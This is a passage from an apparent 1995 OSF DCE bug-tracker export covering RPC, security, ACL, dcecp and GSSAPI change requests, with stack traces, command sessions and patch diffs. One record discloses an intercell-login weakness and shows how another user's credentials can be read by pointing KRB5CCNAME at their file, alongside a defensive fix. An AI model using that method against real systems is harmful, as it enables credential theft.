  [12] rpc__cn_call_executor(arg = 0x2af978, call_was_queued = 0), line 225 in "/afs/transarc.com/project/dce/dev/sb/nydick/nydick2/sb4/src/rpc/runtime/cncthd.c"
  [13] cthread_call_executor(cthread = 0x26cb58), line 604 in "/afs/transarc.com/project/dce/dev/sb/nydick/nydick2/sb4/src/rpc/runtime/comcthd.c"
  [14] pthread_start(arg = 0x26cc28), line 915 in "/afs/transarc.com/project/dce/dev/sb/nydick/nydick2/sb4/src/sol_pth/pthread.c"

I still have the cores if someone would like more information.

[8/10/95 public]

Why do you think that the value is really -1? (rpc_authn_protocol_id_t is
unsigned32.)

In a client binding, auth_info.authn_protocol is set to
rpc_c_authn_dce_private (1) by rpc__krb_bnd_set_auth() (through
rpc_binding_set_auth_info()). It is a read-only field. At the same time,
auth_info.u.auth_identity is set by sec_krb_get_cc(), which really is a
login context. In the above second trace, it was 0x1. Shouldn't it be
0x26bea8? Also, in the second trace, sec_priv_get_eptgt_internal() was
called by sec_priv_get_eptgt_internal(), which shouldn't happen. I think
that the level 6 is really sec_priv_get_eptgt() because privs and stp got
shifted. (The debugger seems to be lying. Can we trust the authn_protocol
value reported by the debugger?) Looks like some sort of memory corruption
because two read-only fields had weird values. (Hard to tell who
corrupted.) Do you still have a core file? If so, can you check the
auth_info_cache list?

[12/21/95 public]

We do not consider this problem critical any
longer, since a workaround has been discovered.

Below are additional notes on how to reproduce the problem, using
which, I hope you will be able to verify whether or not this
has been fixed in DCE 1.2.1:
 
After designating the slave registry as the new master, it takes
about 5 minutes for the registrys to synchronize.  I deliberately
proceeded with the test before the synchronize completed and
reproduced the crash.  If I wait for the registrys to synchronize
then the crash does not occur.  The case of waiting for the
synchronize was tested three times.  We also found that
restarting the crashed secd seemed to work and allow things
to proceed as normal.  For this reason
we should downgrade this defect to sev 3 and make
an appropriate release note to document the workaround.
 
The release note should be something like:
 
"When designating a new master security registry, wait about 5 minutes
to allow the registrys to fully synchronize before doing any
registry write operations (i.e. creating principals etc.).
Check that the registrys are synchronized with "dcecp registry verify"
before performing write operations.  Failure to do so may cause
one of the secd to crash. In that event, simply restart the secd."



CR Number                     : 12934
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : rpccp, dcecp?, etc
Short Description             : showing towers for unknown protseqs
Reported Date                 : 6/26/95
Found in Baseline             : 1.1
Found Date                    : 6/26/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/26/95 public]


I got the following email from Jonathan.  It shows a specific problem,
but we should address the general case:  drop down to showing a tower if
you get a binding from a protseq your host doesn't understand.

Someone will need to adjust my categorizations, or open related OT's.
---------------------------
From: jec@isoft.com (Jonathan Chinitz)
Problem: inconsistent display of RPC server entry information.

Description: invoking rpccp on same entry in CDS yields different displays
of bindings. rpccp displays only towers (bindings) that it can translate
into strings. So rpccp running on a TCP/UDP node does not display non-TCP
or non-UDP bindings. This could confuse a user/administrator that is
looking at an entry to determine what was exported to it.

Sample output:
(This from the OSF1 node)

rpccp> show server /.:/hosts/aus5/dts-entity

>>> no matching objects found

binding information:

  <interface id>   47b333318000.0d.00.01.dc.6c.00.00.00,0.0
  <string binding> ncadg_ip_udp:166.41.144.245[]
  <string binding> ncacn_ip_tcp:166.41.144.245[]


(This from the VMS node)

rpccp> show server /.:/hosts/aus5/dts-entity
>>> no matching objects found

binding information:

  <interface id>   47b333318000.0d.00.01.dc.6c.00.00.00,0.0
  <string binding> ncacn_dnet_nsp:38.705[]
  <string binding> ncacn_ip_tcp:166.41.144.245[]
  <string binding> ncadg_ip_udp:166.41.144.245[]

Jonathan Chinitz        E: jec@isoft.com
IntelliSoft Corp.        Web: http://www.isoft.com
P.O. Box 2645          V: (508) 635-9070
Acton, MA 01720      F: (508) 635-9210



CR Number                     : 12928
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : thr
Subcomponent Name             : cma_select
Short Description             : cma_select() does not support message queues
Reported Date                 : 6/22/95
Found in Baseline             : 1.1
Found Date                    : 6/22/95
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/22/95 public]

Customer reported:

Offering and Version:   all
Component (Module):     src/threads/cma_thdio_4.c:cma_select()
Client Hardware:        RS/6000
Client Software:        AIX

    The AIX version of select() supports message queues (I believe this
    was a AIX enhancement).  From looking at the code, cma_select() does
    not.  I have two questions: 1) Does cma_select() indeed not
    support message queues?  2) If it does not will it ever?



CR Number                     : 12927
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : osf1
Component Name                : sec
Subcomponent Name             : 
Short Description             : kerberos error codes ret'd where DCE sec msgs expected
Reported Date                 : 6/21/95
Found in Baseline             : 1.0.3
Found Date                    : 6/21/95
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/21/95 public]

Kerberos error messages occassionaly percolate up through the
DCE security services.  For these codes no translation to text is
available. In general, kerberos failure messsages are intercepted
inside of DCE and mapped to a DCE message, but this doesn't 
happen all the time.

I have had users give me error status codes that I have then had to
look up in krb5/lib/error_tables files.  This is not right.  Digital
doesn't ship these error table header files.  Do other vendors do this?

Can the kerberos->DCE messaging be cleaned up so that sense can be
made of these error codes?

[12/8/95 public]
Yes, other vendors do ship those msg catalogs, and they translate fine.
I've downgraded this for now, since there's no obvious bug here, just
a friendliness issue over what types of errors appear where.  This is really
be an enhancement request to translate KRB errors to DCE SEC errors,
and I've marked it as such.



CR Number                     : 12926
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : The lex parser in csrc does not handle the documented syntax
Reported Date                 : 6/21/95
Found in Baseline             : 1.1
Found Date                    : 6/21/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/21/95 public]

IBM Edicott reported the problem which happened on all platforms.  I am attaching the defect they opened below, Austin also opened cmvc 13399 to track the problem.

  
prefix        d
name          894
reference
abstract      The lex parser in csrc does not handle the documented syntax
duplicate

state         closed
severity      2
age           0

compName      rpc_csrc                    answer        program_defect
release
envName
level

addDate       95/04/17 09:46:00           assignDate    95/05/04 14:33:19
lastUpdate    95/05/31 11:20:13           responseDate  95/05/04 14:34:55
endDate       95/05/31 11:20:13

ownerLogin    vickip                      originLogin   vickip
ownerName     Vicki Pritko                originName    Vicki Pritko
ownerArea     G98G                        originArea    G98G

defectOrigin

defectType      06I_function
defectTrigger   P06_normal_mode
defectSource    05_imported
defectImpact    06_reliability
actvtyWhnFound  04_UT
phaseInjected   03_LLD

aparNumber
Level 3 Hours

tracks:
    releaseName           state           addDate   lastUpdate target
    --------------------- --------------- --------- ---------- ---------------
    mvs_r2                complete        95/05/04  95/05/22

verify:
    type            state           addDate   lastUpdate userLogin
    --------------- --------------- --------- ---------- ---------------
    original        accept          95/05/04  95/05/31   vickip


history:
    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
    95/04/17 09:46:00    open            vickip (Vicki Pritko)
    95/05/04 14:33:19    assign          vickip (Vicki Pritko)
    95/05/04 14:34:56    accept          vickip (Vicki Pritko)
    95/05/15 17:13:32    modify          vickip (Vicki Pritko)
    95/05/22 07:00:09    verify          harlan (Doug Harlan)
    95/05/31 11:20:13    close           vickip (Vicki Pritko)

duplicate defects: none.

duplicate features: none.

sizing: none.

notes:
    <Note by vickip (Vicki Pritko), 95/04/17 09:46:00, action: open>
The lex parser in csrc does not handle the documented syntax
for the description parameter in the input csrc text file.
The parser does not correctly parse a description line that
contains an ending continuation with text that continues on
the next line.
This is an OSF defect.  I have contacted Austin and Cathy
Wang is now in charge of this defect down there.

    <Note by vickip (Vicki Pritko), 95/05/04 14:33:19, action: assign>
Old Owner: wasselp
New Owner: vickip



    <Note by vickip (Vicki Pritko), 95/05/04 14:34:56, action: accept>
This defect has been accepted.

    <Note by vickip (Vicki Pritko), 95/05/15 17:13:32, action: modify>
Old DefectType:
New DefectType:  06I_function

Old DefectSource:
New DefectSource:  05_imported

Old PhaseInjected:
New PhaseInjected:  03_LLD



CR Number                     : 12923
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : server exec
Short Description             : in dced_fork need to set new
pid entries to 0 when realloc'ing the pid table
Reported Date                 : 6/18/95
Found in Baseline             : 1.1
Found Date                    : 6/18/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/18/95 public]

In dced_fork the table is expanded if no free entries are
found.  The expansion is done with realloc.
If the new entries are not set to 0 they will appear already
in use.



CR Number                     : 12921
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : srvrconf
Short Description             : Assorted ACL problems
Reported Date                 : 6/16/95
Found in Baseline             : 1.1
Found Date                    : 6/16/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/16/95 public]

dced has problems dealing with ACLs on its objects.  I have seen two
errors so far;

1) Adding a 'user_obj' entry to the srvrconf initial object ACL causes
   subsequent attempts to change the initial object ACL to fail; as in

	dcecp> acl show /.:/hosts/itsit/config/srvrconf -io
	{unauthenticated ---r--}
	{user hosts/itsit/self cdfrwx}
	{user cell_admin cdfrwx}
	{any_other ---r--}
	dcecp> acl modify /.:/hosts/itsit/config/srvrconf -io -add {user_obj cdfrwx}
	dcecp> acl show /.:/hosts/itsit/config/srvrconf -io
	{unauthenticated ---r--}
	{user_obj cdfrwx}
	{user hosts/itsit/self cdfrwx}
	{user cell_admin cdfrwx}
	{any_other ---r--}
	dcecp> acl check /.:/hosts/itsit/config/srvrconf
	criI
	dcecp> acl modify /.:/hosts/itsit/config/srvrconf -io -remove {user_obj}
	Error: permission not valid for this acl
	dcecp> acl modify /.:/hosts/itsit/config/srvrconf -io -remove {user cell_admin}
	Error: permission not valid for this acl
	dcecp>

2) cell_admin is able to delete srvrconf objects created by self _if_
   {user_obj cdfrwx} is in the srvrconf initial object ACL or is added
   to the particular srvrconf object.
	I'm not sure whether this is a bug; I would have assumed that
   the "owner" of the srvrconf object was the principal that created it,
   in this case self; but it may be that the "owner" is cell_admin
   (inherited from the CDS entry /.:/hosts/itsit) which case this makes
   perfect sense.

    As self:
	dcecp> acl show /.:/hosts/itsit/config/srvrconf -io
	{unauthenticated ---r--}
	{user_obj cdfrwx}
	{user hosts/itsit/self cdfrwx}
	{any_other ---r--}
	dcecp> server create /.:/hosts/itsit/config/server/Perf -program /etc/perfServer -starton explicit

    As cell_admin:
	dcecp> acl show /.:/hosts/itsit/config/srvrconf/Perf
	{unauthenticated ---r--}
	{user_obj cdfrwx}
	{user hosts/itsit/self cdfrwx}
	{any_other ---r--}
	dcecp> acl check /.:/hosts/itsit/config/srvrconf/Perf
	cdfrwx
	dcecp> server delete /.:/hosts/itsit/config/srvrconf/Perf
	dcecp>

[6/22/95 public]

Problem (1) above is due to buggy code somewhere within the following
stack trace:

(dbx) where
>  0 dce_acl__permset_alg(
        do_deleg = '^@',
        auth = '^A',
        pa_p = 0x661c10,
        ap = 0x24d048,
        own_id = (nil),
        grp_id = (nil),
        mask_perms = 0x24cfd8,
        unauth_mask = 0x24cfd0,
        posix_semantics = 0,
        perms = 0x24d0e8,
        st = 0x24d590
     ) ["/project/dce/build/decdce2.0/src/dce/utils/acldb/acleval.c":529]
   1 dce_acl_inq_permset_for_creds(
        cred_h = (...),
        ap = 0x24d048,
        own_id = (nil),
        grp_id = (nil),
        posix_semantics = 0,
        perms = 0x24d0e8,
        st = 0x24d590
     ) ["/project/dce/build/decdce2.0/src/dce/utils/acldb/acleval.c":759]
   2 dce_acl_inq_client_permset(
        h = 0x363e08,
        mgr_type = 0x24d5a0,
        acl_uuid = 0x24d170,
        own_id = (nil),
        grp_id = (nil),
        permset = 0x24d0e8,
        st = 0x24d590
     ) ["/project/dce/build/decdce2.0/src/dce/utils/acldb/acleval.c":186]
   3 dce_acl_is_client_authorized(
        h = 0x363e08,
        mgr_type = 0x24d5a0,
        acl_uuid = 0x24d170,
        own_id = (nil),
        grp_id = (nil),
        desired_perms = 8,
        authorized = 0x24d160,
        st = 0x24d590
     ) ["/project/dce/build/decdce2.0/src/dce/utils/acldb/acleval.c":122]
   4 dce_rdacl_replace(
        h = 0x363e08,
        component_name = 0x662530,
        mgr_type = 0x24d5a0,
        sec_acl_type = sec_acl_type_default_object,
        sec_acl_list = 0x697530,
        st = 0x24d590
     ) ["/project/dce/build/decdce2.0/src/dce/utils/acldb/aclimpl.c":360]
   5 op1_ssr(...)

The relevant portion of dce_rdacl_replace() is

   358      LOCK;
   359      if (h) {
>  360          dce_acl_is_client_authorized(h, mgr_type, &auuid, NULL, NULL,
   361                  am_info->control_perm, &ok, st);
   362          if (!ok) {
   363              UNLOCK;
   364              *st = sec_acl_invalid_permission;
   365              return;
   366          }
   367      }

Note that dce_acl_is_client_authorized is passed an owner ID and group ID of
NULL.

The relevant portion of dce_acl__permset_alg() is

   521      /* Now that we know which entries match the user described in the PAC,
   522       * check the permissions corresponding to each entry until access is
   523       * granted by one of them. */
   524
   525      /* USER_OBJ check (masking is differnt than the others) */
   526      if (user_obj_ep) {
   527          /* If user_obj entry exists, owner cannot be NULL */
   528          if (own_id == NULL) {
>* 529              *st = sec_acl_expected_user_obj;
   530              return TRUE;
   531          }

Note that if a user_obj entry exists in the ACL, then dce_acl__permset_alg()
will reject any call that contains a NULL owner ID; also, from the stack
trace, the owner ID is not filled in anywhere on the way to the call to
dce_acl__permset_alg().

	So, is dce_rdacl_replace() wrong to pass NULL owner and group
IDs, or is dce_acl__permset_alg() wrong to reject the call?

[9/11/95 public]

Or aclmgr is broken for user/group_obj. :-) Seriously, aclmgr's
user/group_obj implementation is incomplete. (Not surprisingly, because the
security AES discourages the use of user/group_obj.)

[09/11/95 public]
Yes, user/group_obj support was added to the ACL lib at the "last minute."
It involved many quick trips among the offices of the person who wrote
the spec, was writing the code, and who wrote the security AES. :)



CR Number                     : 12919
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : creds/auth
Short Description             : creds shareable by all clients from foreign cell
Reported Date                 : 6/15/95
Found in Baseline             : 1.1
Found Date                    : 6/15/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/15/95 public]

Mike Burati sent out this detailed explanation of a weakness in the way
creds for foreign cell principals are stored in the local filesystem:

>There's another limitation which I don't believe is documented well enough,
>that I believe all vendors should be made aware of, so that they can deal
>with it as they see fit.
>
>Allowing intercell login poses yet another security limitation, unless you
>trust all members of your cell when you perform an intercell login.  (I can
>hear the "huh?" responses now :-)
>
>When you perform an intercell login (user Mike from Cell A logs into a
>machine in Cell B as /.../cella/mike), it is not possible for the processes
>created for you on that machine (assume Unix for this scenario) to run as
>the Unix ID assigned to user mike in Cell A (because that same Unix ID may
>be assigned to another user in Cell B).  Thus, ALL users from Cell A that
>log into a machine in Cell B, using intercell login, will be assigned the
>Unix ID of the account created in CellB for CellA's intercell trust
>(krbtgt/cella).
>
>While '/.../cella/mike' is logged on to this machine in Cell B, *any* user
>from CellA can log onto that machine and have the same Unix credentials as
>Mike.  This allows any of those /.../cella/* users to log into that machine
>and access the DCE credentials stored for /.../cella/mike (since they're
>stored in a file protected by the Unix ID krbtgt/cella).  Any one of these
>users could remove the credentials, or improperly obtain them (as simple as
>setting KRB5CCNAME to Mike's credential files).
>
>What does this mean?
>It means Intercell Login is less useful than customers may be led to
>believe, if they don't understand what the limitations are.  Intercell
>trust for RPCs is what a customer may really want when they connect two
>cells, but by default intercell login is allowed after that point, so
>uninformed users and admins could be affected by this limitation.  We are
>in the process of opening an OT warning about this limitation and
>suggesting how a vendor might make abuse of this limitation more difficult
>and require administrator intervention (don't allow intercell logins by
>default just because intercell trust has been established).


The workaround we're recommending is to require an administrative decision
on a per-foreign cell basis to enable such intercell logins, by causing the
security server to check for the validity flag on any of the foreign cell's
accounts (typically there's exactly one, krbtgt/foreign-cell.none.none, but
this is not architecturally specified.)  This is a change in default behav-
ior that will have to be publicized in admin/config docs and release notes.


--- rpriv.c     Tue Jun 13 16:19:37 1995
***************
*** 335,336 ****
--- 335,345 ----
  
+       sec_rgy_login_name_t    fcell_aname;
+       sec_rgy_cursor_t        cursor;
+       sec_rgy_sid_t           sid;
+       sec_rgy_unix_sid_t      unix_sid;
+       sec_rgy_acct_key_t      key_part;
+       sec_rgy_acct_user_t     user_part;
+       sec_rgy_acct_admin_t    admin_part;
+       error_status_t          xst;
+ 
        /* 
***************
*** 366,367 ****
--- 375,401 ----
                SET_STATUS(stp, sec_priv_s_invalid_request);
+               goto get_ptgt_cleanup;
+           }
+ 
+           /*
+            * Verify that remote logins are allowed on any foreign cell
+            * account -- this affords some control over the "shared creds"
+            * problem, which occurs because all remote users' creds are
+            * stored in the local filesystem under the same uid owner.
+            */
+           u_strcpy(fcell_aname.pname, authz_data.client_tgt_princ);
+           fcell_aname.gname[0] = '\0';
+           fcell_aname.oname[0] = '\0';
+           rs_util_clear_cursor(&cursor);
+           SET_STATUS(stp, sec_priv_s_invalid_trust_path);
+ 
+           for (;;) {
+               rsdb_acct_lookup(&fcell_aname, &cursor,
+                                &sid, &unix_sid, &key_part,
+                                &user_part, &admin_part, &xst);
+               if (BAD_STATUS(&xst))
+                   break;
+               if (admin_part.flags & sec_rgy_acct_admin_valid) {
+                   CLEAR_STATUS(stp);
+                   break;
+               }
            }

--- rpriv_v1_1_mgrs.c   Tue Jun 13 16:19:56 1995
***************
*** 1482,1483 ****
--- 1482,1519 ----
            }
+ 
+           if (STATUS_OK(status)) {
+               /*
+                * Verify that remote logins are allowed on any foreign cell
+                * account -- this affords some control over the "shared creds"
+                * problem, which occurs because all remote users' creds are
+                * stored in the local filesystem under the same uid owner.
+                */
+ 
+               sec_rgy_login_name_t    fcell_aname;
+               sec_rgy_cursor_t        cursor;
+               sec_rgy_sid_t           sid;
+               sec_rgy_unix_sid_t      unix_sid;
+               sec_rgy_acct_key_t      key_part;
+               sec_rgy_acct_user_t     user_part;
+               sec_rgy_acct_admin_t    admin_part;
+               error_status_t          xst;
+ 
+               u_strcpy(fcell_aname.pname, authz_data.client_tgt_princ);
+               fcell_aname.gname[0] = '\0';
+               fcell_aname.oname[0] = '\0';
+               rs_util_clear_cursor(&cursor);
+               SET_STATUS(status, sec_priv_s_invalid_trust_path);
+ 
+               for (;;) {
+                   rsdb_acct_lookup(&fcell_aname, &cursor,
+                                       &sid, &unix_sid, &key_part,
+                                       &user_part, &admin_part, &xst);
+                   if (BAD_STATUS(&xst))
+                       break;
+                   if (admin_part.flags & sec_rgy_acct_admin_valid) {
+                       CLEAR_STATUS(status);
+                       break;
+                   }
+               }
+           }
        }

[02/02/96 public]
Yow, these diffs are out of date -- later removed & changes made to other
modules.  This spirit of the description remains, though:  in DCE 1.2.1
the cell account validity flag is checked, and dcecp "registry connect"
has two new switches (-acctvalid & -facctvalid) that allow the selection
of permitting such intercell logins.

No further plans to address this problem; left as enhancement.



CR Number                     : 12917
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 12864
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dcecp
Subcomponent Name             : 
Short Description             : cellalias set and cdsalias set are disabled
Reported Date                 : 6/15/95
Found in Baseline             : 1.1wp, 1.2
Found Date                    : 6/15/95
Severity                      : A
Priority                      : 0
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : nextrel
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/15/95 public]
While testing for H Cells it was noted that the cellalias set command in
dcecp is disabled for this release.  According to the documentation in the
Admin Guide (Chap. 21) this is required for H Cells.  Without this command
it does not seem possible to get H Cells to work properly.

[06/15/95 public]
See the release notes; it's disabled because the underlying security
support isn't reliable.  "cellalias set" isn't strictly necessary for
configuring hierarchical cells, only for "moving" an existing cell
into another.

[01/22/96 public]

This has been changed to an enhancement from a defect with the PM team's
agreement.

[3/1/96 public]

Oh, the 'cdsalias set' command has been disabled as well as the
'cellalias set' command.  Both can be put back as soon as the
underlying security work is complete.



CR Number                     : 12916
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dcecp
Subcomponent Name             : 
Short Description             : host start/stop don't work
Reported Date                 : 6/15/95
Found in Baseline             : 1.1, 1.2
Found Date                    : 6/15/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/15/95 public]
While testing for H Cells we noticed that the "dcecp -c host start" and the
"dcecp -c host stop" commands do not work.  According to the documetation in
the Admin Guide these commands are supposed to be used to start and stop the
DCE daemons.  John Rousseau has also noted that these commands do not work.

[7/27/95 public]
Notes from IBM (relocated to proper place):

The workaround for the documentation problem in the H Cells config
is for us to use rc.dce (to start the daemons) and dce.clean (to stop
the daemons).  For the OSF code this would be using dce_config to
start and stop the daemons.

[3/1/96 [public]
The original host show/start/stop commands rely on the dce
servers on the node being represented by srvrconf and srvrexec
objects.  The show, start, and stop commands do not work because
the dce core daemons cannot be started AND controlled by dced.
The 'fork' nature of the daemons causes dced to lose control
when the daemon forks off the child (which stays up as the daemon)
and then dies.  dced knows it started the daemon, but it thinks
it died, so no srvrexec object is created.

This, plus the new acl and functionality changes that went into
dced late in the development cycle really hosed the 'host' command.



CR Number                     : 12912
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : gssapi
Short Description             : unused arguments in gss_init_sec_context
Reported Date                 : 6/7/95
Found in Baseline             : 1.1
Found Date                    : 6/7/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/7/95 public]

In the gss_init_sec_context routine the 7th argument is passed in 
but never used.  I am opening this on behalf of the IBM AIX 
Security Team.

[7/16/95 public]

Does anyone have an opinion about this defect?

[7/17/95 public]

Yes - It's not a bug, it's a feature :-).

The GSSAPI spec says that this argument (time_req) is for the user to specify
a requested length of time that the created context will remain valid.  Since
the DCE imeplementation allows contexts to remain valid indefinitely (and
correctly reports this via the time_rec return parameter), the time_req
parameter serves no purpose in the DCE implementation, and is ignored.

I'd say this defect should be cancelled.  However, raising the priority to 
B2 implies that there is a critical need for a fix.  What problem would
reading (and presumably honoring) this argument solve?

[7/19/95 public]

I am appending this from an IBM internal defect.  Please bear 
with the IBM stuff in this.  Please tell us if the behavior on HPUX
or OSF/1 is different....

    <Note by jejones (Ed Jones), 95/07/18 10:55:06, action: note>
GSS does not return indefinite in the non-mutual authentication case, it 
returns zero (see the first two notes above, when mutual authentication is
not being used, the client does not issue the gss_init_sec_context a second
time). Without going any further, this is a defect.
If we are not going to tell the user how long a context is valid for, we 
should document this in the description of gss_init_sec_context. The fact that
we are not going to support context lifetimes, but support creds lifetimes,
as shown by the proper setting of the lifetime_req and lifetime_rec parameters
on the gssdce_login_context_to_cred call, is somewhat inconsistent. What it  
seems to me we are doing is telling the user that your credentials are valid fora given length of time, but we are not going to tell you how long t
he contexts
you create from the creds are good for, either at the context init time or
through the query context life remaing call (gss_context_time). The information
seems to be there, we should look at the effort needed to fully support the
API.
In addition, we should be making it as easy as possible to port existing GSS
applications to use the DCE Security mechanisms, without requiring too many
code changes. By supporting context lifetimes, we make it easier for an
application to know when it must re-authenticate to DCE. It seems to me that 
an application that is concerned about security would not desire to have
indefinite context lifetimes, but would want to be able to protect itself
by constantly creating new contexts, for all the reasons that DCE gives for 
reauthenticating frequently.

[7/20/95 public]

If gss_init_sec_Context is returning 0 as the context lifetime (when it returns
a status of GSS_S_COMPLETE), that's certainly a bug.  However, from the
description above, it sounds as though gss_init_sec_context hasn't finished - 
it needs to be called a second time.  Even if the application doesn't ask for
mutual authentication, sequence numbers have to be set up in each direction,
so that integrity protection can work in either direction, and the protocol
requires a reply message to do that.  The application should not be assuming
that, just because mutual authentication was not requested, a response message
is not required.  A valid GSSAPI-caller should always invoke the
gss_init_sec_context/gss_accept_sec_context calls inside a loop, checking
both the output-token length field to determine whether there is a token to
send, and the return status to see whether to exit the loop.  It sounds as
though, in this case, the application isn't waiting for the reply message. 
Can you verify that the application is checking the return status of
gss_init_sec_context, and that a status of GSS_S_CONTINUE_NEEDED isn't
being returned?  If a value of zero is being returned as the context lifetime
when gss_init_sec_context really has finished, could you open a fresh OT 
about that, please?


By returning the value GSS_C_INDEFINITE, GSSAPI is indicating that, as far as
it can tell, the context will never expire.  Once a context is established,
use of the per-message services allow the recipient to determine that the
originator of a message is the same entity that authenticated.  They don't
necessarily mean that that entity would be capable of re-authenticating.
The only reason to expire a context is to protect the session key against
over-use, and how much is over-use isn't obvious to GSSAPI (it really
depends on what you perceive as the threat, and how valuable is the aggregate
of all data that you have sent over the context).  Thus, GSSAPI doesn't have
any reason to impose a lifetime of its own.

Now, if the user asks for a finite lifetime, I guess GSSAPI could enforce
it (it currently doesn't).  The intended behavior is to return GSS_C_INDEFINITE
in all cases.  However, if an application has decided that it wants to renew
the context after a given time, then the application is capable of noticing
when that time arrives and doing the rollover then.  Note that a portable
application would have to do this anyway, since the GSSAPI spec doesn't require
that GSSAPI honor the application's request for a particular lifetime, even
if the GSSAPI implementation does support context expiration.  A GSSAPI may
ignore the application's request, may round it up or down (although rounding
down is unfriendly, and shouldn't be done if it can be avoided), or it may 
enforce it.  The lifetime_req parameter is intended as a hint to the GSSAPI
implementation about the length of time that the application is going to want
to use the context, so that if something special has to be done to create a 
context that will last that long, then GSSAPI should do the extra work.  It's
not supposed to be a way for applications to get a timer service from GSSAPI.



CR Number                     : 12904
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 10110,13023
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : context rundown problems w/TCP
Short Description             : TCP context rundown problem when client connection is terminated catastrophically (i.e. reboot, network disconnect)
Reported Date                 : 6/5/95
Found in Baseline             : 1.0.3
Found Date                    : 04/20/95
Severity                      : A
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/5/95]

(from Grant Alvis @ IBM )
I would like to revisit Problem Report #21350, which has been closed.  Here
is the info:

The Problem Report I reported, #21350, was closed, with an indication that
the problem had been fixed in DCE 1.1 (OT 10110), and that I could retro-fit
the code into the DCE 1.0.3 code base.  However, after looking at the proposed
fix more closely, I can see that the fix will not solve the problem we are
seeing.  Here is a more detailed explanation (Note this is a CN problem.  DG
works fine):

I have looked at the OSF fix, OT 10110, and it will not fix the problem we are
seeing.  The fix in OT 10110 indicates that it fixes a problem with the server
processing when it cleans up the association and group state machines.  The
server in our case, gets no indication of a client disconnect, so it never does
ANY cleanup.   Therefore, this fix to correct the way the server cleans up will
not help us.  We are not seeing incorrect server cleanup, we are seeing NO
server cleanup.

The problem we are seeing is that when a client is catastrophically
disconnected (ie reboot, network disconnect), the server gets ABSOLUTELY NO
INDICATION that the client has gone away.  I have attached a sniffer to the
network, and when the client machine is violently removed from the network,
the server shows no ip activity.  Also, I compiled the RPC runtime with
-DDEBUG, and set:

RPC_DEBUG=11.3,11.5,11.10,13.1,13.2,13.3 

in order to see any activity on the server side, regarding any cancel
requests, and CN RPC Protocol State Machine activity, and there was none.
The server thinks everything is fine, and that the client is still there.
Subsequent calls to the server from other clients work fine, but the server
will NEVER clean up the association of the disconnected client, and will NEVER
invoke its context rundown routine.

The problem seems to be with the fact that the server does not set the
SO_KEEPALIVE option on its server side sockets, so there is no periodic
checking going on to see if the client is alive.  In a normal client 
disconnect(ie just the client process goes away, not the clients network) 
the clientsnetwork sends an indication to the server that the client has gone 
away. However, when the clients network goes away, the server never gets 
any indication that the client is gone, and without the SO_KEEPALIVE option 
set,the server socket will never get an ETIMEDOUT error.

Client side sockets do have the SO_KEEPALIVE option set, so when a server
is disconnected from the network, the client WILL get an indication that
